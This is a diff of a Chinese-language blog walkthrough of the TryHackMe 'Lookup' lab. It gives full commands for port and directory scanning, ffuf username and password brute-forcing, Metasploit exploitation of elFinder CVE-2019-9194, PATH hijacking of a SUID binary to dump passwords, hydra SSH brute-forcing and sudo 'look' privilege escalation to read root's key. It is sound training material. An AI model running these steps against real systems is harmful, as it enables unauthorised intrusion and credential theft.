@@ -36,11 +36,31 @@
 <meta property="og:site_name" content="Blog">
 <meta property="og:description" content="链接：https:&#x2F;&#x2F;tryhackme.com&#x2F;r&#x2F;room&#x2F;lookup 总体思路：端口&amp;目录扫描-&gt;暴力破解-&gt;CVE-2019-9194-&gt;路径劫持-&gt;sudo提权端口&amp;目录扫描123456789101112131415161718192021222324252627282930313233343536373839nmap -sSVC lookup.">
 <meta property="og:locale">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208000753433.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208001624631.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208001705303.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208001807501.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208001952227.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208002152507.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208002316427.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208002644071.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208003934814.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208004002396.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208004132158.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208004642640.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208005019423.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208005300763.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208005547902.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208005842964.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208005942627.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208010131169.png">
+<meta property="og:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208010242750.png">
 <meta property="article:published_time" content="2024-12-09T04:16:54.137Z">
 <meta property="article:modified_time" content="2024-12-09T04:18:05.354Z">
 <meta property="article:author" content="Berry">
 <meta property="article:tag" content="THM">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yim2onzhoi.github.io/2024/12/09/Lookup/image-20241208000753433.png">
   
   
     <link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml">
@@ -199,43 +219,43 @@
 <h2 id="总体思路：端口-目录扫描-暴力破解-CVE-2019-9194-路径劫持-sudo提权"><a href="#总体思路：端口-目录扫描-暴力破解-CVE-2019-9194-路径劫持-sudo提权" class="headerlink" title="总体思路：端口&amp;目录扫描-&gt;暴力破解-&gt;CVE-2019-9194-&gt;路径劫持-&gt;sudo提权"></a>总体思路：端口&amp;目录扫描-&gt;暴力破解-&gt;CVE-2019-9194-&gt;路径劫持-&gt;sudo提权</h2><h2 id="端口-目录扫描"><a href="#端口-目录扫描" class="headerlink" title="端口&amp;目录扫描"></a>端口&amp;目录扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">nmap -sSVC lookup.thm</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-07 23:35 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> localhost</span><br><span class="line">Host is up (0.39s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)</span><br><span class="line">|   256 0a:4b:b9:b1:77:d2:48:79:<span class="built_in">fc</span>:2f:8a:3d:64:3a:ad:94 (ECDSA)</span><br><span class="line">|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to http://lookup.thm</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">dirsearch -u lookup.thm</span><br><span class="line"></span><br><span class="line">[23:50:13] 403 -  275B  - /.ht_wsr.txt                                      </span><br><span class="line">[23:50:13] 403 -  275B  - /.htaccess.bak1                                   </span><br><span class="line">[23:50:14] 403 -  275B  - /.htaccess.orig                                   </span><br><span class="line">[23:50:14] 403 -  275B  - /.htaccess.save</span><br><span class="line">[23:50:14] 403 -  275B  - /.htaccess_orig</span><br><span class="line">[23:50:14] 403 -  275B  - /.htaccess.sample</span><br><span class="line">[23:50:14] 403 -  275B  - /.htaccess_extra</span><br><span class="line">[23:50:14] 403 -  275B  - /.htaccessOLD                                     </span><br><span class="line">[23:50:14] 403 -  275B  - /.htaccess_sc</span><br><span class="line">[23:50:14] 403 -  275B  - /.html                                            </span><br><span class="line">[23:50:14] 403 -  275B  - /.htaccessOLD2</span><br><span class="line">[23:50:14] 403 -  275B  - /.htpasswds                                       </span><br><span class="line">[23:50:14] 403 -  275B  - /.htm</span><br><span class="line">[23:50:14] 403 -  275B  - /.htpasswd_test</span><br><span class="line">[23:50:14] 403 -  275B  - /.htaccessBAK                                     </span><br><span class="line">[23:50:14] 403 -  275B  - /.httr-oauth                                      </span><br><span class="line">[23:50:20] 403 -  275B  - /.php                                             </span><br><span class="line">[23:52:23] 200 -    1B  - /login.php                                        </span><br><span class="line">[23:53:10] 403 -  275B  - /server-status/                                   </span><br><span class="line">[23:53:10] 403 -  275B  - /server-status</span><br></pre></td></tr></table></figure>
 
 <p>目前来看就一个登录界面，先进去查看</p>
-
+<img src="/2024/12/09/Lookup/image-20241208000753433.png" class="" title="image-20241208000753433">
 
 <p>先随机尝试几个用户名和密码</p>
+<img src="/2024/12/09/Lookup/image-20241208001624631.png" class="" title="image-20241208001624631">
 
-
-
+<img src="/2024/12/09/Lookup/image-20241208001705303.png" class="" title="image-20241208001705303">
 
 <h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>发现他的报错信息不一样，可以利用这一点，先爆破出存在的用户名</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u <span class="string">&#x27;http://lookup.thm/login.php&#x27;</span> -H <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -X POST -d <span class="string">&#x27;username=FUZZ&amp;password=admin&#x27;</span> -w /usr/share/seclists/Usernames/Names/names.txt -mc all -ic -fs 74 -t 100</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2024/12/09/Lookup/image-20241208001807501.png" class="" title="image-20241208001807501">
 
 <p>有admin和jose两个用户，再使用ffuf爆破其密码</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u &#x27;http://lookup.thm/login.php&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -X POST -d &#x27;username=jose&amp;password=FUZZ&#x27; -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -mc all -ic -fs 62 -t 100</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2024/12/09/Lookup/image-20241208001952227.png" class="" title="image-20241208001952227">
 
 <p>获得jose的密码为<strong>password123</strong></p>
 <p>登录后发现其将我们跳转到了files.lookup.thm，这里需要将域名加入hosts后才能访问</p>
-
+<img src="/2024/12/09/Lookup/image-20241208002152507.png" class="" title="image-20241208002152507">
 
 <p>进来后界面长这样↓</p>
-
+<img src="/2024/12/09/Lookup/image-20241208002316427.png" class="" title="image-20241208002316427">
 
 <h2 id="CVE-2019-9194"><a href="#CVE-2019-9194" class="headerlink" title="CVE-2019-9194"></a>CVE-2019-9194</h2><p>查阅功能点后，发现了elFinder版本为2.1.47，在exploitDB上搜索其漏洞</p>
-
+<img src="/2024/12/09/Lookup/image-20241208002644071.png" class="" title="image-20241208002644071">
 
 <p>发现可以直接使用msf进行漏洞利用</p>
-
+<img src="/2024/12/09/Lookup/image-20241208003934814.png" class="" title="image-20241208003934814">
 
 <p>选择模块4，设置好参数后exploit</p>
-
+<img src="/2024/12/09/Lookup/image-20241208004002396.png" class="" title="image-20241208004002396">
 
 <p>新建一个shell，将其转发到本地，并优化界面</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2024/12/09/Lookup/image-20241208004132158.png" class="" title="image-20241208004132158">
 
 <p>查看本机存在的用户</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="built_in">ls</span> /home</span><br></pre></td></tr></table></figure>
@@ -245,35 +265,35 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/snap/snapd/19457/usr/lib/snapd/snap-confine</span><br><span class="line">...</span><br><span class="line">/usr/sbin/pwm</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/umount</span><br></pre></td></tr></table></figure>
 
 <p>其中&#x2F;usr&#x2F;sbin&#x2F;pwm较为可疑，运行它</p>
-
+<img src="/2024/12/09/Lookup/image-20241208004642640.png" class="" title="image-20241208004642640">
 
 <p>提示说&#x2F;home&#x2F;www-data&#x2F;.passwords并不存在，因为我们知道，home目录下只有think用户，且其中有.passwords文件</p>
-
+<img src="/2024/12/09/Lookup/image-20241208005019423.png" class="" title="image-20241208005019423">
 
 <h2 id="路径劫持"><a href="#路径劫持" class="headerlink" title="路径劫持"></a>路径劫持</h2><p>这里尝试使用路径劫持，将id命令的输出修改为think，然后将其路径修改到tmp目录下</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;#!/bin/bash\necho &quot;uid=33(think) gid=33(www-data) groups=33(www-data)&quot;&#x27;</span> &gt; /tmp/id</span><br><span class="line"><span class="built_in">chmod</span> 777 /tmp/id</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2024/12/09/Lookup/image-20241208005300763.png" class="" title="image-20241208005300763">
 
 <p>可以看到执行完毕后，使用id命令输出的即为think用户</p>
 <p>再次运行pwm，输出了许多行密码，保存下来用于爆破think用户密码</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l think -P pass.txt lookup.thm ssh</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2024/12/09/Lookup/image-20241208005547902.png" class="" title="image-20241208005547902">
 
 <p>密码为<strong>josemario.AKA(think)</strong></p>
 <p>登录到SSH</p>
 <p>查看当前用户可执行权限</p>
-
+<img src="/2024/12/09/Lookup/image-20241208005842964.png" class="" title="image-20241208005842964">
 
 <h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><p>能够以任何用户执行look命令，在<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>上查看提权命令</p>
-
+<img src="/2024/12/09/Lookup/image-20241208005942627.png" class="" title="image-20241208005942627">
 
 <p>这里可以选择直接读root.txt，也可以选择读id_rsa</p>
-
+<img src="/2024/12/09/Lookup/image-20241208010131169.png" class="" title="image-20241208010131169">
 
 <p>使用id_rsa登录到root用户</p>
-
+<img src="/2024/12/09/Lookup/image-20241208010242750.png" class="" title="image-20241208010242750">
       
     </div>
     <footer class="article-footer">
